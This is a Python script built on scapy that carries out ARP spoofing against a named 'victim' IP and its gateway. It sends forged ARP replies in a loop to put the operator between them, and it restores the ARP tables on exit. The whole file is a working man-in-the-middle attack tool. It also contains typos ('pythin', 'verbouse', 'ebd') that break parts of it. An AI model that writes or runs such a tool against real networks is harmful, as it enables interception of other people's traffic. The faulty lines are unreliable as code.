#!/usr/bin/env pythin

import scapy.all as scapy
import time
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target_ip", dest="target_ip", help="Victim address ip")
    parser.add_option("-g", "--gateway_ip", dest="gateway_ip", help="Gateway ip")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify an target ip, use --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a gateway ip, use --help for more info")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac )
    scapy.send(packet, count=4, verbouse=False)


options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
sent_packets_counts = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_counts += 2
        print("\r[+] Sent two packets" + str(sent_packets_counts), ebd="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] detected CTRL + C .... Quitting")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)